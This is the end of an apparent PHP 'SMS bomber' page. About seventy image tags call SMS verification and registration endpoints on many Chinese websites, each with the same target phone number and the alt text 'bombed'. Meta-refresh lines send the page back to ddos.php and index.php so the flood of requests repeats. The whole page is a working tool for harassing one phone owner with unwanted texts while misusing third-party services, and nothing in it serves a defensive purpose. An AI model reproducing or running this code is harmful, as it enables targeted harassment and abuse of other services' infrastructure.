<img src=’http://user.syyx.com/ajax/users/checkusername.aspx?u=1396589698&r=0.42031912299903756′ alt=’已轰炸’/>
<img src=’http://www.keepc.com/findAccountInfoByAccount.act?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=1396589698′ alt=’已轰炸’/>
<img src=’http://gwpassport2.woniu.com/v2/checkusername?jsoncallback=jQuery172013263149083391296_1365068016801&username=1396589698&_=1365068030671′ alt=’已轰炸’/>
<img src=’http://passport.upaidui.com/mobiles/send_validation_code?mobile_number=1396589698′ alt=’已轰炸’/>
<img src=’http://user.51wan.com/reg_index_check_0.html?type=username&is=mobile&username=1396589698′ alt=’已轰炸’/>
<img src=’http://interface.game.renren.com/ActivityCenter/?catalog=plugins&gameid=all&aname=reg&method=reg.subUserInfo&mobile=1396589698&callback=jQuery17204292543791520399_1365068164751&_=1365068180406′ alt=’已轰炸’/>
<img src=’http://my.xoyo.com/register/NewIsExist/?uid=1396589698′ alt=’已轰炸’/>
<img src=’http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.016777698590329404&userid=1396589698′ alt=’已轰炸’/>
<img src=’http://member.changyou.com/register/checkPhoneIsUsed.do?securityPhone=1396589698′ alt=’已轰炸’/>
<img src=’http://www.game5.com/member/sendRegisterVerifyCode?reg_mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.kongzhong.com/acc.do?m=sendPhoneVcodeFast&callback=jQuery17200752385214847075_1364445730228&phone=1396589698&smsvcode=%E8%BE%93%E5%85%A5%E6%89%8B%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81&_=1364445764320′ alt=’已轰炸’/>
<img src=’http://www.pceggs.com/myaccount/mobile_ajax.aspx?refresh=0&i_mobileNo=1396589698′ alt=’已轰炸’/>
<img src=’http://www.9dapai.com/SMSAuthentication/SMSAuthenticationPage.aspx/btnGenerateCheckCode_Click?(Content)={cellnum:’1396589698′}’ alt=’已轰炸’/>
<img src=’http://www.veryzhun.com/ajax/register.asp?mobile=1396589698&areacode=86′ alt=’已轰炸’/>
<img src=’http://wap.callda.com/register_2.jsp?phoneNumber=1396589698′ alt=’已轰炸’/>
<img src=’http://www.200call.com/index.php?action=vphone?uphone=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.12580call.cn/index.php?register&phone=1396589698′ alt=’已轰炸’/>
<img scr=’http://w.yunpan.360.cn/intf.php?method=Sms.issue&qid=177256015&devtype=box&v=1.9.2.1245&devid=5b5b55bfc9f1f3113963b1f1350adc65&devname=&rtick=6969759&sign=aa8d029e8036f3f9d555956388dc4c57&ofmt=xml&pid=home&mobile=1396589698&contype=mdu&token=3708649921.6.95535003.177256015.1366401362′ alt=’已轰炸’/>
<img src=’http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.6334787302703851&userid=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.17u.cn/Member/RegisterHandler.ashx?action=phone&phone=1396589698&iid=0.6011805873638694′ alt=’已轰炸’/>
<img src=’http://3g.163.com/t/signup.do?mobile=1396589698&sub=%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E7%9F%AD%E4%BF%’ alt=’已轰炸’/>
<img src=’http://m.mail.163.com/reg.s?regtype=mobile&method=registerMobile&mobile_num=1396589698&password=testtest&password2=testtest&action=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF=400′ alt=’已轰炸’/>
<img src=’http://account.jzyx.com/common/send-sms.html?tel=1396589698′ alt=’已轰炸’/>
<img src=’http://t.sdo.com/home/SendSms?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://txz.sdo.com/common/msgsend/?m=1396589698&t=2&method=SendAPPDownLoadSMSCallback&fromid=weblogin&r=0.9407026621045355′ alt=’已轰炸’/>
<img src=’https://mcas.sdo.com/authen/checkAccountType.jsonp?callback=checkAccountType_JSONPMethod&inputUserId=1396589698′ alt=’已轰炸’/>
<img src=’http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16202903677772887056_1353757072377&userId=1396589698&_=1353757193062′ alt=’已轰炸’/>
<img src=’https://reg.95538.cn/userreg/AjaxHandler.ashx?method=getPhoneCode?mobilePhone=1396589698&type=0′ alt=’已轰炸’/>
<img src=’http://u.baidu.com/?module=default&controller=Reg&action=sendSMS&b1350745948890=1&mobile=1396589698&appid=3&ucname=huisexinxi’ alt=’已轰炸’/>
<img src=’http://as.baidu.com/a/msg?act=sendtomobile&f=topic_3001_2_0&mobile=1396589698&docid=1439803&ctime=1353852949890′ alt=’已轰炸’/>
<img src=’http://as.baidu.com/a/msg?act=sendtomobile&f=web_alad_6%40next%40software_1003_6&mobile=1396589698&docid=1346020&ctime=1350747592671′ alt=’已轰炸’/>
<img src=’http://api.pengyou.com/json.php?mod=mobilebind&act=sendsms&mobile=1396589698&g_tk=null’ alt=’已轰炸’/>
<img src=’http://www.maiduo.com/handler/Register/Register.ashx?act=check&mobile=1396589698&checkCode=undefined’ alt=’已轰炸’/>
<img src=’http://www.sinosig.com/auth/regist_resetMsg.action?sso_userName=1396589698&isAjaxSubmit=true’ alt=’已轰炸’/>
<img src=’http://www.pubyun.com/accounts/signup_vcode/4449056/?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://dealer.autohome.com.cn/Handler/SendMessage.ashx?action=sendcode&mob=1396589698′ alt=’已轰炸’/>
<img src=’http://yuyue.shdc.org.cn/User/ajaxSendConfirmCode.aspx?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://reg.ztgame.com/registe/mobilePhoneRegister?type=isBindPhoneNum&phoneNum=1396589698′ alt=’已轰炸’/>
<img src=’http://www.baixing.com/ajax/auth/sendCode/?type=resetPassword&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://mail.sina.com.cn/cgi-bin/phonecode.php?phonenumber=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.q.com.cn/register/index/ajaxcheckmobile/?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://yun.baidu.com/account/v1/api/sendacodenormal?dest=1396589698′ alt=’已轰炸’/>
<img src=’https://reg.passport.the9.com/api/chk_loginname?loginname=1396589698&accounttype=reg_mobile’ alt=’已轰炸’/>
<img src=’https://login.sina.com.cn/signup/check_user.php?format=json&from=mobile&name=1396589698′ alt=’已轰炸’/>
<img src=’http://js.ac.10086.cn/jsauth/reg?method=sendVerCode&=1396589698′ alt=’已轰炸’/>
<img src=’http://my.xoyo.com/register/isExist/0.8101254514227967?uid=1396589698&type=mobile’ alt=’已轰炸’/>
<img src=’http://member.changyou.com/register/checkPhoneIsUsed.do?securityPhone=1396589698′ alt=’已轰炸’/>
<img src=’https://reg.91.com/AjaxAction/AC_register.ashx?action=verifyusernameofmobile&txtUserNameOfMobile=1396589698′ alt=’已轰炸’/>
<img src=’http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.wanmei.com/NoteAction.do?method=sendRegCode?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16203658856788579764_1366925187811&userId=1396589698&_=1366925195670′ alt=’已轰炸’/>
<img src=’http://www.guahao.com/validcode/json/mobile/1396589698/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545′ alt=’已轰炸’/>
<img src=’http://chinatelecom.zc.qq.com/cgi-bin/send_sms?phonenum=1396589698&stype=1′ alt=’已轰炸’/>
<img src=’http://cas.sdo.com/authen/sendPhoneCheckCode.jsonp?callback=sendPhoneCheckCode_JSONPMethod&inputUserId=1396589698&type=3&appId=201&areaId=0&serviceUrl=’ alt=’已轰炸’/>
<img src=’http://sdo.com&productVersion=v5&frameType=3&locale=zh_CN&version=21&tag=20&authenSource=2&productId=2&_=1366924349498′ alt=’已轰炸’/>
<img src=’http://www.1732.com/public/ajax.aspx?app=resendcode&bindaccount=1396589698′ alt=’已轰炸’/>
<img src=’http://sign.kting.cn/register/getphoneverify/phone/1396589698′ alt=’已轰炸’/>
<img src=’http://m.xs8.cn/user/quick_signup.html?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://bbs.360che.com/ajax1.php?action=ds21&mobilenum=1396589698&inajax=1&ajaxtarget=ts’ alt=’已轰炸’/>
<img src=’http://pass.ledu.com/reg/mobilecode?type=reg&mobile=1396589698&r=0.7577109599155907′ alt=’已轰炸’/>
<img src=’http://www.52callme.com/Handler/SendVerifyCodeHandler.ashx?m=1396589698′ alt=’已轰炸’/>
<img src=’http://sso.letv.com/user/mobileRegCode/mobile/1396589698/mobilecodeletvid/c326961366927138′ alt=’已轰炸’/>
<img src=’http://www.sinosig.com/auth/regist_refresh.action?sso_userName=1396589698&resetSend=1′ alt=’已轰炸’/>
<img src=’https://sn.ac.10086.cn/sendMsgRequest?mobileNumber=1396589698′ alt=’已轰炸’/>
<img src=’https://fj.ac.10086.cn/SMSCodeSend?mobileNum=1396589698&validCode=0000&errorurl=https://fj.ac.10086.cn/4login/errorPage.jsp&name=menhu’ alt=’已轰炸’/>
<img src=’https://fj.ac.10086.cn/SMSCodeSend?mobileNum=1396589698&validCode=0000&errorurl=http://www.fj.10086.cn:80/service/login/send.jsp’ alt=’已轰炸’/>
<img src=’https://fj.ac.10086.cn/ssouser/sendMessage.do?mobileno=1396589698′ alt=’已轰炸’/>
<img src=’http://www.gs.10086.cn/gs_obsh_service/actionDispatcher.do?userMobile=1396589698′ alt=’已轰炸’/>
<img src=’https://sn.ac.10086.cn/sendMsgRequest?code=%E7%82%B9%E5%87%BB%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81&mobileNumber=1396589698′ alt=’已轰炸’/>
<img src=’https://js.ac.10086.cn/jsauth/dzqd/pagSendDypass?umobile=1396589698′ alt=’已轰炸’/>
<img src=’http://gd.10086.cn/ngcrm/hall/SendRandomSms.action?mobile=1396589698&isReRequest=false’ alt=’已轰炸’/>
<img src=’http://liao.189.cn/ECP-Portals/phoneDown/download.do?phone=1396589698′ alt=’已轰炸’/>
<img src=’https://ecplive.cn/reg/servlet/ivrInvokeServlet?number=1396589698&flagNum=3′ alt=’已轰炸’/><meta http-equiv=refresh content=’0; url=ddos.php?hm=1396589698&amp;c=2′>
</div>";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'";
}
?>
</div>
</body>
</html>